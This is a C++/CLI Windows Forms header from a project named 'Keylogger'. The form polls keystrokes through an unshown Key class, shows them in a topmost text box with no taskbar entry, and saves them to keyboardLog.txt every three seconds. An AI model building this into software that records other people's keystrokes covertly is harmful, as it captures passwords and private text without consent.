#pragma once
#include <Windows.h>
#include "Header.h"

namespace Keylogger {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for MyForm
	/// </summary>
	public ref class MyForm : public System::Windows::Forms::Form
	{
	public:
		MyForm(void)
		{
			InitializeComponent();
			k = new Key();
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~MyForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::TextBox^  log;
	private: System::Windows::Forms::Timer^  timer;
	private: Key *k;
	private: System::Windows::Forms::Timer^  saveTimer;

	private: System::ComponentModel::IContainer^  components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			this->log = (gcnew System::Windows::Forms::TextBox());
			this->timer = (gcnew System::Windows::Forms::Timer(this->components));
			this->saveTimer = (gcnew System::Windows::Forms::Timer(this->components));
			this->SuspendLayout();
			// 
			// log
			// 
			this->log->AcceptsReturn = true;
			this->log->BorderStyle = System::Windows::Forms::BorderStyle::None;
			this->log->Cursor = System::Windows::Forms::Cursors::Arrow;
			this->log->Font = (gcnew System::Drawing::Font(L"Segoe UI", 7.8F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->log->Location = System::Drawing::Point(13, 12);
			this->log->MaxLength = 65536;
			this->log->Multiline = true;
			this->log->Name = L"log";
			this->log->ReadOnly = true;
			this->log->ScrollBars = System::Windows::Forms::ScrollBars::Vertical;
			this->log->Size = System::Drawing::Size(287, 489);
			this->log->TabIndex = 0;
			// 
			// timer
			// 
			this->timer->Enabled = true;
			this->timer->Tick += gcnew System::EventHandler(this, &MyForm::timer1_Tick);
			// 
			// saveTimer
			// 
			this->saveTimer->Enabled = true;
			this->saveTimer->Interval = 3000;
			this->saveTimer->Tick += gcnew System::EventHandler(this, &MyForm::saveTimer_Tick);
			// 
			// MyForm
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(8, 16);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::White;
			this->ClientSize = System::Drawing::Size(312, 513);
			this->Controls->Add(this->log);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::FixedSingle;
			this->Location = System::Drawing::Point(100, 200);
			this->MaximizeBox = false;
			this->MinimizeBox = false;
			this->Name = L"MyForm";
			this->ShowInTaskbar = false;
			this->Text = L"Êויכמדדונ";
			this->TopMost = true;
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void timer1_Tick(System::Object^  sender, System::EventArgs^  e) {
		k->getKeys(this->log);
	}
	private: System::Void saveTimer_Tick(System::Object^  sender, System::EventArgs^  e) {
		try {
			System::IO::File::WriteAllText("keyboardLog.txt", log->Text);
		}
		catch (...) {}
	}
	};
}
